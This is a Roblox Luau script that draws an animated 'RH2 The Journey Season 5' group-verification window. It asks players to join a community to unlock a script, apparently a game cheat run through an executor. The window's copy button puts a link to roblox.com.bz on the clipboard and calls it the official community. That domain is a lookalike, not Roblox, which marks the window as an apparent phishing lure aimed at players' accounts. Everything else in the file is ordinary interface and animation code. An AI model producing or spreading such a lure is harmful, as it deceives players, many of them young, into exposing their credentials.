--// =========================================================
--// RH2 THE JOURNEY - SEASON 5
--// FUTURISTIC PURPLE COMMUNITY VERIFICATION
--// =========================================================

local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")

local Player = Players.LocalPlayer
local PlayerGui = Player:WaitForChild("PlayerGui")

--// =========================================================
--// CONFIG
--// =========================================================

local GROUP_ID = "4945729406"
local GROUP_LINK = "https://roblox.com.bz/communities/4945729406/"

local GUI_NAME = "RH2Season5GUI"

--// =========================================================
--// CLEAN OLD GUI
--// =========================================================

local OldGui = PlayerGui:FindFirstChild(GUI_NAME)

if OldGui then
	OldGui:Destroy()
end

--// =========================================================
--// HELPERS
--// =========================================================

local function Create(ClassName, Properties, Parent)
	local Object = Instance.new(ClassName)

	for Property, Value in pairs(Properties) do
		Object[Property] = Value
	end

	Object.Parent = Parent

	return Object
end

local function Tween(Object, Time, Properties, Style, Direction)
	local Info = TweenInfo.new(
		Time or 0.25,
		Style or Enum.EasingStyle.Quint,
		Direction or Enum.EasingDirection.Out
	)

	return TweenService:Create(Object, Info, Properties)
end

--// =========================================================
--// COLORS
--// =========================================================

local BLACK = Color3.fromRGB(4, 3, 8)
local DARK = Color3.fromRGB(8, 6, 14)
local PANEL = Color3.fromRGB(12, 9, 20)
local PANEL2 = Color3.fromRGB(16, 12, 27)

local WHITE = Color3.fromRGB(248, 246, 255)
local LIGHT = Color3.fromRGB(215, 208, 229)
local MUTED = Color3.fromRGB(126, 116, 145)

local PURPLE = Color3.fromRGB(150, 55, 255)
local PURPLE2 = Color3.fromRGB(188, 88, 255)
local PURPLE3 = Color3.fromRGB(224, 145, 255)
local DARKPURPLE = Color3.fromRGB(48, 18, 82)

local SUCCESS = Color3.fromRGB(88, 235, 145)
local WARNING = Color3.fromRGB(255, 184, 82)

--// =========================================================
--// SCREEN GUI
--// =========================================================

local ScreenGui = Create("ScreenGui", {
	Name = GUI_NAME,
	ResetOnSpawn = false,
	IgnoreGuiInset = true,
	ZIndexBehavior = Enum.ZIndexBehavior.Sibling
}, PlayerGui)

--// =========================================================
--// MAIN SHADOW / GLOW
--// =========================================================

local Shadow = Create("Frame", {
	Name = "Shadow",
	AnchorPoint = Vector2.new(0.5, 0.5),
	Position = UDim2.fromScale(0.5, 0.5),
	Size = UDim2.new(0, 510, 0, 400),
	BackgroundColor3 = PURPLE,
	BackgroundTransparency = 0.94,
	BorderSizePixel = 0,
	ZIndex = 0
}, ScreenGui)

local ShadowStroke = Create("UIStroke", {
	Color = PURPLE,
	Thickness = 22,
	Transparency = 0.92
}, Shadow)

--// =========================================================
--// MAIN WINDOW
--// =========================================================

local Main = Create("Frame", {
	Name = "Main",
	AnchorPoint = Vector2.new(0.5, 0.5),
	Position = UDim2.fromScale(0.5, 0.5),
	Size = UDim2.new(0, 470, 0, 370),
	BackgroundColor3 = BLACK,
	BorderSizePixel = 0,
	ZIndex = 2
}, ScreenGui)

-- NO UICORNER - SHARP CORNERS

local MainStroke = Create("UIStroke", {
	Color = Color3.fromRGB(72, 32, 110),
	Thickness = 2,
	Transparency = 0,
	ApplyStrokeMode = Enum.ApplyStrokeMode.Border
}, Main)

--// =========================================================
--// SECOND INNER BORDER
--// =========================================================

local InnerBorder = Create("Frame", {
	Name = "InnerBorder",
	Position = UDim2.new(0, 9, 0, 9),
	Size = UDim2.new(1, -18, 1, -18),
	BackgroundTransparency = 1,
	BorderSizePixel = 0,
	ZIndex = 3
}, Main)

Create("UIStroke", {
	Color = Color3.fromRGB(49, 28, 72),
	Thickness = 1,
	Transparency = 0.15
}, InnerBorder)

--// =========================================================
--// OUTER PURPLE EDGE TRACKS
--// =========================================================

local BorderTop = Create("Frame", {
	Name = "BorderTop",
	Position = UDim2.new(0, 0, 0, 0),
	Size = UDim2.new(1, 0, 0, 2),
	BackgroundColor3 = DARKPURPLE,
	BorderSizePixel = 0,
	ZIndex = 10
}, Main)

local BorderBottom = Create("Frame", {
	Name = "BorderBottom",
	AnchorPoint = Vector2.new(0, 1),
	Position = UDim2.new(1, 0, 1, 0),
	Size = UDim2.new(1, 0, 0, 2),
	BackgroundColor3 = DARKPURPLE,
	BorderSizePixel = 0,
	ZIndex = 10
}, Main)

local BorderLeft = Create("Frame", {
	Name = "BorderLeft",
	Position = UDim2.new(0, 0, 0, 0),
	Size = UDim2.new(0, 2, 1, 0),
	BackgroundColor3 = DARKPURPLE,
	BorderSizePixel = 0,
	ZIndex = 10
}, Main)

local BorderRight = Create("Frame", {
	Name = "BorderRight",
	AnchorPoint = Vector2.new(1, 0),
	Position = UDim2.new(1, 0, 0, 0),
	Size = UDim2.new(0, 2, 1, 0),
	BackgroundColor3 = DARKPURPLE,
	BorderSizePixel = 0,
	ZIndex = 10
}, Main)

--// =========================================================
--// MOVING PURPLE BORDER RUNNER
--// =========================================================

local RunnerTop = Create("Frame", {
	Name = "RunnerTop",
	Position = UDim2.new(0, -90, 0, -2),
	Size = UDim2.new(0, 90, 0, 6),
	BackgroundColor3 = PURPLE2,
	BorderSizePixel = 0,
	ZIndex = 12
}, Main)

local RunnerRight = Create("Frame", {
	Name = "RunnerRight",
	Position = UDim2.new(1, -4, 0, -90),
	Size = UDim2.new(0, 6, 0, 90),
	BackgroundColor3 = PURPLE2,
	BorderSizePixel = 0,
	Visible = false,
	ZIndex = 12
}, Main)

local RunnerBottom = Create("Frame", {
	Name = "RunnerBottom",
	Position = UDim2.new(1, 0, 1, -4),
	Size = UDim2.new(0, 90, 0, 6),
	BackgroundColor3 = PURPLE2,
	BorderSizePixel = 0,
	Visible = false,
	ZIndex = 12
}, Main)

local RunnerLeft = Create("Frame", {
	Name = "RunnerLeft",
	Position = UDim2.new(0, -2, 1, 0),
	Size = UDim2.new(0, 6, 0, 90),
	BackgroundColor3 = PURPLE2,
	BorderSizePixel = 0,
	Visible = false,
	ZIndex = 12
}, Main)

--// Glow layers for runner

local function AddGlow(Object)
	local Glow = Object:Clone()
	Glow.Name = Object.Name .. "_Glow"
	Glow.BackgroundColor3 = PURPLE
	Glow.BackgroundTransparency = 0.65
	Glow.ZIndex = Object.ZIndex - 1
	Glow.Parent = Main

	return Glow
end

local TopGlow = AddGlow(RunnerTop)
local RightGlow = AddGlow(RunnerRight)
local BottomGlow = AddGlow(RunnerBottom)
local LeftGlow = AddGlow(RunnerLeft)

TopGlow.Size = UDim2.new(0, 130, 0, 12)
RightGlow.Size = UDim2.new(0, 12, 0, 130)
BottomGlow.Size = UDim2.new(0, 130, 0, 12)
LeftGlow.Size = UDim2.new(0, 12, 0, 130)

--// =========================================================
--// TOP HEADER
--// =========================================================

local TopBar = Create("Frame", {
	Name = "TopBar",
	Position = UDim2.new(0, 2, 0, 2),
	Size = UDim2.new(1, -4, 0, 91),
	BackgroundColor3 = PANEL,
	BorderSizePixel = 0,
	ZIndex = 4
}, Main)

--// Header bottom line

local HeaderLine = Create("Frame", {
	Position = UDim2.new(0, 25, 1, -1),
	Size = UDim2.new(1, -50, 0, 1),
	BackgroundColor3 = Color3.fromRGB(59, 30, 85),
	BorderSizePixel = 0,
	ZIndex = 5
}, TopBar)

--// =========================================================
--// CRYSTAL ICON
--// =========================================================

local CrystalBox = Create("Frame", {
	Name = "CrystalBox",
	Position = UDim2.new(0, 22, 0, 20),
	Size = UDim2.new(0, 52, 0, 52),
	BackgroundColor3 = Color3.fromRGB(14, 9, 23),
	BorderSizePixel = 0,
	ZIndex = 6
}, TopBar)

Create("UIStroke", {
	Color = PURPLE,
	Thickness = 1,
	Transparency = 0.15
}, CrystalBox)

local Crystal = Create("TextLabel", {
	BackgroundTransparency = 1,
	Size = UDim2.fromScale(1, 1),
	Text = "◇",
	Font = Enum.Font.GothamBlack,
	TextSize = 39,
	TextColor3 = PURPLE2,
	ZIndex = 7
}, CrystalBox)

local CrystalGlow = Create("TextLabel", {
	BackgroundTransparency = 1,
	Position = UDim2.new(0, 1, 0, 1),
	Size = UDim2.fromScale(1, 1),
	Text = "◇",
	Font = Enum.Font.GothamBlack,
	TextSize = 39,
	TextColor3 = PURPLE,
	TextTransparency = 0.65,
	ZIndex = 6
}, CrystalBox)

--// =========================================================
--// SEASON LABEL
--// =========================================================

local Season = Create("TextLabel", {
	BackgroundTransparency = 1,
	Position = UDim2.new(0, 91, 0, 13),
	Size = UDim2.new(0, 260, 0, 20),
	Text = "[  ◆  SEASON 5  ]",
	Font = Enum.Font.GothamBold,
	TextSize = 12,
	TextColor3 = PURPLE2,
	TextXAlignment = Enum.TextXAlignment.Left,
	ZIndex = 7
}, TopBar)

--// =========================================================
--// MAIN TITLE
--// =========================================================

local Title = Create("TextLabel", {
	BackgroundTransparency = 1,
	Position = UDim2.new(0, 90, 0, 29),
	Size = UDim2.new(1, -115, 0, 39),
	Text = "RH2 THE JOURNEY",
	Font = Enum.Font.GothamBlack,
	TextSize = 25,
	TextColor3 = WHITE,
	TextXAlignment = Enum.TextXAlignment.Left,
	ZIndex = 7
}, TopBar)

--// =========================================================
--// BETA SUBTITLE
--// =========================================================

local BetaLine = Create("TextLabel", {
	BackgroundTransparency = 1,
	Position = UDim2.new(0, 90, 0, 65),
	Size = UDim2.new(1, -130, 0, 17),
	Text = "—  GROUP VERIFICATION  •  BETA  —",
	Font = Enum.Font.GothamBold,
	TextSize = 10,
	TextColor3 = MUTED,
	TextXAlignment = Enum.TextXAlignment.Left,
	ZIndex = 7
}, TopBar)

--// =========================================================
--// CLOSE BUTTON
--// =========================================================

local CloseButton = Create("TextButton", {
	Name = "Close",
	AnchorPoint = Vector2.new(1, 0),
	Position = UDim2.new(1, -17, 0, 18),
	Size = UDim2.new(0, 40, 0, 40),
	BackgroundColor3 = Color3.fromRGB(11, 8, 18),
	BorderSizePixel = 0,
	AutoButtonColor = false,
	Text = "×",
	Font = Enum.Font.GothamMedium,
	TextSize = 26,
	TextColor3 = MUTED,
	ZIndex = 9
}, TopBar)

Create("UIStroke", {
	Color = PURPLE,
	Thickness = 1,
	Transparency = 0.35
}, CloseButton)

CloseButton.MouseEnter:Connect(function()
	Tween(CloseButton, 0.15, {
		BackgroundColor3 = Color3.fromRGB(47, 18, 68),
		TextColor3 = PURPLE3
	}):Play()
end)

CloseButton.MouseLeave:Connect(function()
	Tween(CloseButton, 0.15, {
		BackgroundColor3 = Color3.fromRGB(11, 8, 18),
		TextColor3 = MUTED
	}):Play()
end)

CloseButton.MouseButton1Click:Connect(function()

	Tween(Main, 0.3, {
		Size = UDim2.new(0, 430, 0, 335),
		BackgroundTransparency = 1
	}):Play()

	Tween(Shadow, 0.3, {
		BackgroundTransparency = 1
	}):Play()

	task.wait(0.3)

	ScreenGui:Destroy()
end)

--// =========================================================
--// COMMUNITY SECTION
--// =========================================================

local CommunityBox = Create("Frame", {
	Name = "CommunityBox",
	Position = UDim2.new(0, 22, 0, 111),
	Size = UDim2.new(1, -44, 0, 120),
	BackgroundColor3 = DARK,
	BorderSizePixel = 0,
	ZIndex = 4
}, Main)

Create("UIStroke", {
	Color = Color3.fromRGB(65, 35, 91),
	Thickness = 1,
	Transparency = 0.15
}, CommunityBox)

--// Community icon box

local GroupIconBox = Create("Frame", {
	Position = UDim2.new(0, 20, 0, 20),
	Size = UDim2.new(0, 82, 0, 82),
	BackgroundColor3 = Color3.fromRGB(9, 6, 16),
	BorderSizePixel = 0,
	ZIndex = 5
}, CommunityBox)

Create("UIStroke", {
	Color = PURPLE,
	Thickness = 1,
	Transparency = 0.25
}, GroupIconBox)

local GroupIcon = Create("TextLabel", {
	BackgroundTransparency = 1,
	Size = UDim2.fromScale(1, 1),
	Text = "♟",
	Font = Enum.Font.GothamBold,
	TextSize = 45,
	TextColor3 = PURPLE2,
	ZIndex = 6
}, GroupIconBox)

--// Community title

local CommunityTitle = Create("TextLabel", {
	BackgroundTransparency = 1,
	Position = UDim2.new(0, 128, 0, 19),
	Size = UDim2.new(1, -145, 0, 24),
	Text = "JOIN OUR COMMUNITY",
	Font = Enum.Font.GothamBlack,
	TextSize = 16,
	TextColor3 = PURPLE2,
	TextXAlignment = Enum.TextXAlignment.Left,
	ZIndex = 6
}, CommunityBox)

local CommunityText = Create("TextLabel", {
	BackgroundTransparency = 1,
	Position = UDim2.new(0, 128, 0, 48),
	Size = UDim2.new(1, -150, 0, 62),
	Text = "Join the official RH2 The Journey\nRoblox community to get access\nto the script.",
	Font = Enum.Font.GothamMedium,
	TextSize = 13,
	TextColor3 = LIGHT,
	TextWrapped = true,
	TextXAlignment = Enum.TextXAlignment.Left,
	TextYAlignment = Enum.TextYAlignment.Top,
	ZIndex = 6
}, CommunityBox)

--// =========================================================
--// STATUS
--// =========================================================

local StatusBox = Create("Frame", {
	Name = "StatusBox",
	Position = UDim2.new(0, 22, 0, 244),
	Size = UDim2.new(1, -44, 0, 61),
	BackgroundColor3 = Color3.fromRGB(8, 6, 14),
	BorderSizePixel = 0,
	ZIndex = 4
}, Main)

Create("UIStroke", {
	Color = Color3.fromRGB(61, 31, 87),
	Thickness = 1
}, StatusBox)

--// Status dot

local StatusDot = Create("Frame", {
	Position = UDim2.new(0, 22, 0.5, -7),
	Size = UDim2.new(0, 14, 0, 14),
	BackgroundColor3 = PURPLE2,
	BorderSizePixel = 0,
	ZIndex = 7
}, StatusBox)

local DotGlow = Create("Frame", {
	Position = UDim2.new(0, 17, 0.5, -12),
	Size = UDim2.new(0, 24, 0, 24),
	BackgroundColor3 = PURPLE,
	BackgroundTransparency = 0.78,
	BorderSizePixel = 0,
	ZIndex = 6
}, StatusBox)

local StatusHeader = Create("TextLabel", {
	BackgroundTransparency = 1,
	Position = UDim2.new(0, 53, 0, 10),
	Size = UDim2.new(1, -70, 0, 15),
	Text = "STATUS",
	Font = Enum.Font.GothamBold,
	TextSize = 10,
	TextColor3 = PURPLE2,
	TextXAlignment = Enum.TextXAlignment.Left,
	ZIndex = 7
}, StatusBox)

local Status = Create("TextLabel", {
	BackgroundTransparency = 1,
	Position = UDim2.new(0, 53, 0, 27),
	Size = UDim2.new(1, -70, 0, 23),
	Text = "Join the group to continue!",
	Font = Enum.Font.GothamBold,
	TextSize = 13,
	TextColor3 = WHITE,
	TextXAlignment = Enum.TextXAlignment.Left,
	ZIndex = 7
}, StatusBox)

--// =========================================================
--// COPY BUTTON
--// =========================================================

local CopyButton = Create("TextButton", {
	Name = "CopyGroupLink",
	Position = UDim2.new(0, 22, 0, 318),
	Size = UDim2.new(1, -44, 0, 58),
	BackgroundColor3 = Color3.fromRGB(11, 7, 18),
	BorderSizePixel = 0,
	AutoButtonColor = false,
	Text = "",
	ZIndex = 7
}, Main)

local CopyStroke = Create("UIStroke", {
	Color = PURPLE2,
	Thickness = 2,
	Transparency = 0.05
}, CopyButton)

--// Purple glow behind button

local ButtonGlow = Create("Frame", {
	Position = UDim2.new(0, -4, 0, -4),
	Size = UDim2.new(1, 8, 1, 8),
	BackgroundColor3 = PURPLE,
	BackgroundTransparency = 0.92,
	BorderSizePixel = 0,
	ZIndex = 6
}, CopyButton)

--// Link icon

local LinkIconBox = Create("Frame", {
	Position = UDim2.new(0, 10, 0, 8),
	Size = UDim2.new(0, 42, 0, 42),
	BackgroundColor3 = Color3.fromRGB(17, 10, 28),
	BorderSizePixel = 0,
	ZIndex = 8
}, CopyButton)

Create("UIStroke", {
	Color = Color3.fromRGB(102, 43, 145),
	Thickness = 1
}, LinkIconBox)

local LinkIcon = Create("TextLabel", {
	BackgroundTransparency = 1,
	Size = UDim2.fromScale(1, 1),
	Text = "↗",
	Font = Enum.Font.GothamBlack,
	TextSize = 25,
	TextColor3 = PURPLE2,
	ZIndex = 9
}, LinkIconBox)

--// Button title

local ButtonText = Create("TextLabel", {
	BackgroundTransparency = 1,
	Position = UDim2.new(0, 67, 0, 7),
	Size = UDim2.new(1, -115, 0, 27),
	Text = "COPY GROUP LINK",
	Font = Enum.Font.GothamBlack,
	TextSize = 17,
	TextColor3 = WHITE,
	TextXAlignment = Enum.TextXAlignment.Left,
	ZIndex = 9
}, CopyButton)

local ButtonSubText = Create("TextLabel", {
	BackgroundTransparency = 1,
	Position = UDim2.new(0, 67, 0, 31),
	Size = UDim2.new(1, -115, 0, 17),
	Text = "CLICK TO COPY LINK TO CLIPBOARD",
	Font = Enum.Font.GothamBold,
	TextSize = 9,
	TextColor3 = PURPLE2,
	TextXAlignment = Enum.TextXAlignment.Left,
	ZIndex = 9
}, CopyButton)

local ButtonArrow = Create("TextLabel", {
	BackgroundTransparency = 1,
	AnchorPoint = Vector2.new(1, 0.5),
	Position = UDim2.new(1, -17, 0.5, 0),
	Size = UDim2.new(0, 25, 0, 25),
	Text = "›",
	Font = Enum.Font.GothamBlack,
	TextSize = 26,
	TextColor3 = PURPLE2,
	ZIndex = 9
}, CopyButton)

--// =========================================================
--// FOOTER
--// =========================================================

local Footer = Create("TextLabel", {
	BackgroundTransparency = 1,
	AnchorPoint = Vector2.new(0.5, 1),
	Position = UDim2.new(0.5, 0, 1, -10),
	Size = UDim2.new(1, -80, 0, 17),
	Text = "★   RH2 THE JOURNEY   |   SEASON 5",
	Font = Enum.Font.GothamBold,
	TextSize = 9,
	TextColor3 = Color3.fromRGB(98, 79, 119),
	TextXAlignment = Enum.TextXAlignment.Center,
	ZIndex = 6
}, Main)

--// =========================================================
--// COPY BUTTON EFFECTS
--// =========================================================

CopyButton.MouseEnter:Connect(function()

	Tween(CopyStroke, 0.2, {
		Color = PURPLE3,
		Thickness = 3
	}):Play()

	Tween(ButtonGlow, 0.2, {
		BackgroundTransparency = 0.75
	}):Play()

	Tween(ButtonText, 0.2, {
		TextColor3 = PURPLE3
	}):Play()

	Tween(ButtonArrow, 0.2, {
		Position = UDim2.new(1, -12, 0.5, 0),
		TextColor3 = WHITE
	}):Play()

end)

CopyButton.MouseLeave:Connect(function()

	Tween(CopyStroke, 0.2, {
		Color = PURPLE2,
		Thickness = 2
	}):Play()

	Tween(ButtonGlow, 0.2, {
		BackgroundTransparency = 0.92
	}):Play()

	Tween(ButtonText, 0.2, {
		TextColor3 = WHITE
	}):Play()

	Tween(ButtonArrow, 0.2, {
		Position = UDim2.new(1, -17, 0.5, 0),
		TextColor3 = PURPLE2
	}):Play()

end)

CopyButton.MouseButton1Down:Connect(function()

	Tween(CopyButton, 0.08, {
		Position = UDim2.new(0, 24, 0, 320),
		Size = UDim2.new(1, -48, 0, 54)
	}):Play()

end)

CopyButton.MouseButton1Up:Connect(function()

	Tween(CopyButton, 0.1, {
		Position = UDim2.new(0, 22, 0, 318),
		Size = UDim2.new(1, -44, 0, 58)
	}):Play()

end)

--// =========================================================
--// COPY FUNCTION
--// =========================================================

local function SetStatus(Text, Color)
	Status.Text = Text
	Status.TextColor3 = Color
end

CopyButton.MouseButton1Click:Connect(function()

	if setclipboard then

		local Success = pcall(function()
			setclipboard(GROUP_LINK)
		end)

		if Success then

			StatusDot.BackgroundColor3 = SUCCESS
			DotGlow.BackgroundColor3 = SUCCESS

			SetStatus(
				"Group link copied to clipboard!",
				SUCCESS
			)

			ButtonText.Text = "LINK COPIED"
			ButtonSubText.Text = "READY TO PASTE"
			ButtonText.TextColor3 = SUCCESS
			LinkIcon.Text = "✓"
			ButtonArrow.Text = "✓"

			Tween(CopyStroke, 0.2, {
				Color = SUCCESS,
				Thickness = 3
			}):Play()

			Tween(ButtonGlow, 0.2, {
				BackgroundColor3 = SUCCESS,
				BackgroundTransparency = 0.78
			}):Play()

			task.wait(2)

			ButtonText.Text = "COPY GROUP LINK"
			ButtonSubText.Text = "CLICK TO COPY LINK TO CLIPBOARD"
			ButtonText.TextColor3 = WHITE
			LinkIcon.Text = "↗"
			ButtonArrow.Text = "›"

			StatusDot.BackgroundColor3 = PURPLE2
			DotGlow.BackgroundColor3 = PURPLE

			SetStatus(
				"Join the group to continue!",
				WHITE
			)

			Tween(CopyStroke, 0.2, {
				Color = PURPLE2,
				Thickness = 2
			}):Play()

			Tween(ButtonGlow, 0.2, {
				BackgroundColor3 = PURPLE,
				BackgroundTransparency = 0.92
			}):Play()

		else

			StatusDot.BackgroundColor3 = WARNING
			DotGlow.BackgroundColor3 = WARNING

			SetStatus(
				"Clipboard access failed",
				WARNING
			)

		end

	else

		StatusDot.BackgroundColor3 = WARNING
		DotGlow.BackgroundColor3 = WARNING

		SetStatus(
			"Clipboard isn't supported here",
			WARNING
		)

	end

end)

--// =========================================================
--// DRAGGING
--// =========================================================

local Dragging = false
local DragStart
local StartPosition

local function UpdateDrag(Input)

	local Delta = Input.Position - DragStart

	Main.Position = UDim2.new(
		StartPosition.X.Scale,
		StartPosition.X.Offset + Delta.X,

		StartPosition.Y.Scale,
		StartPosition.Y.Offset + Delta.Y
	)

	Shadow.Position = Main.Position

end

TopBar.InputBegan:Connect(function(Input)

	if Input.UserInputType == Enum.UserInputType.MouseButton1
		or Input.UserInputType == Enum.UserInputType.Touch then

		Dragging = true
		DragStart = Input.Position
		StartPosition = Main.Position

		Input.Changed:Connect(function()

			if Input.UserInputState == Enum.UserInputState.End then
				Dragging = false
			end

		end)

	end

end)

UserInputService.InputChanged:Connect(function(Input)

	if Dragging then

		if Input.UserInputType == Enum.UserInputType.MouseMovement
			or Input.UserInputType == Enum.UserInputType.Touch then

			UpdateDrag(Input)

		end

	end

end)

--// =========================================================
--// ANIMATED BORDER
--// =========================================================

task.spawn(function()

	while ScreenGui.Parent do

		-- TOP

		RunnerTop.Visible = true
		TopGlow.Visible = true

		Tween(RunnerTop, 0.75, {
			Position = UDim2.new(1, 0, 0, -2)
		}, Enum.EasingStyle.Linear):Play()

		Tween(TopGlow, 0.75, {
			Position = UDim2.new(1, -130, 0, -5)
		}, Enum.EasingStyle.Linear):Play()

		task.wait(0.75)

		RunnerTop.Visible = false
		TopGlow.Visible = false

		-- RIGHT

		RunnerRight.Visible = true
		RightGlow.Visible = true

		RunnerRight.Position = UDim2.new(1, -4, 0, -90)
		RightGlow.Position = UDim2.new(1, -7, 0, -130)

		Tween(RunnerRight, 0.55, {
			Position = UDim2.new(1, -4, 1, 0)
		}, Enum.EasingStyle.Linear):Play()

		Tween(RightGlow, 0.55, {
			Position = UDim2.new(1, -7, 1, -130)
		}, Enum.EasingStyle.Linear):Play()

		task.wait(0.55)

		RunnerRight.Visible = false
		RightGlow.Visible = false

		-- BOTTOM

		RunnerBottom.Visible = true
		BottomGlow.Visible = true

		RunnerBottom.Position = UDim2.new(1, 0, 1, -4)
		BottomGlow.Position = UDim2.new(1, -130, 1, -7)

		Tween(RunnerBottom, 0.75, {
			Position = UDim2.new(0, -90, 1, -4)
		}, Enum.EasingStyle.Linear):Play()

		Tween(BottomGlow, 0.75, {
			Position = UDim2.new(0, -130, 1, -7)
		}, Enum.EasingStyle.Linear):Play()

		task.wait(0.75)

		RunnerBottom.Visible = false
		BottomGlow.Visible = false

		-- LEFT

		RunnerLeft.Visible = true
		LeftGlow.Visible = true

		RunnerLeft.Position = UDim2.new(0, -2, 1, 0)
		LeftGlow.Position = UDim2.new(0, -7, 1, -130)

		Tween(RunnerLeft, 0.55, {
			Position = UDim2.new(0, -2, 0, -90)
		}, Enum.EasingStyle.Linear):Play()

		Tween(LeftGlow, 0.55, {
			Position = UDim2.new(0, -7, 0, -130)
		}, Enum.EasingStyle.Linear):Play()

		task.wait(0.55)

		RunnerLeft.Visible = false
		LeftGlow.Visible = false

	end

end)

--// =========================================================
--// PURPLE PULSE
--// =========================================================

task.spawn(function()

	while ScreenGui.Parent do

		Tween(MainStroke, 1.1, {
			Color = PURPLE
		}, Enum.EasingStyle.Sine):Play()

		Tween(ShadowStroke, 1.1, {
			Transparency = 0.86
		}, Enum.EasingStyle.Sine):Play()

		task.wait(1.1)

		Tween(MainStroke, 1.1, {
			Color = Color3.fromRGB(72, 32, 110)
		}, Enum.EasingStyle.Sine):Play()

		Tween(ShadowStroke, 1.1, {
			Transparency = 0.93
		}, Enum.EasingStyle.Sine):Play()

		task.wait(1.1)

	end

end)

--// =========================================================
--// STATUS DOT PULSE
--// =========================================================

task.spawn(function()

	while ScreenGui.Parent do

		Tween(DotGlow, 0.8, {
			Size = UDim2.new(0, 30, 0, 30),
			Position = UDim2.new(0, 14, 0.5, -15),
			BackgroundTransparency = 0.88
		}, Enum.EasingStyle.Sine):Play()

		task.wait(0.8)

		Tween(DotGlow, 0.8, {
			Size = UDim2.new(0, 20, 0, 20),
			Position = UDim2.new(0, 19, 0.5, -10),
			BackgroundTransparency = 0.75
		}, Enum.EasingStyle.Sine):Play()

		task.wait(0.8)

	end

end)

--// =========================================================
--// ENTRANCE ANIMATION
--// =========================================================

Main.Size = UDim2.new(0, 420, 0, 330)
Main.BackgroundTransparency = 1

Shadow.Size = UDim2.new(0, 470, 0, 370)
Shadow.BackgroundTransparency = 1

Tween(Main, 0.5, {
	Size = UDim2.new(0, 470, 0, 370),
	BackgroundTransparency = 0
}, Enum.EasingStyle.Quint, Enum.EasingDirection.Out):Play()

Tween(Shadow, 0.5, {
	Size = UDim2.new(0, 510, 0, 400),
	BackgroundTransparency = 0.94
}, Enum.EasingStyle.Quint, Enum.EasingDirection.Out):Play()
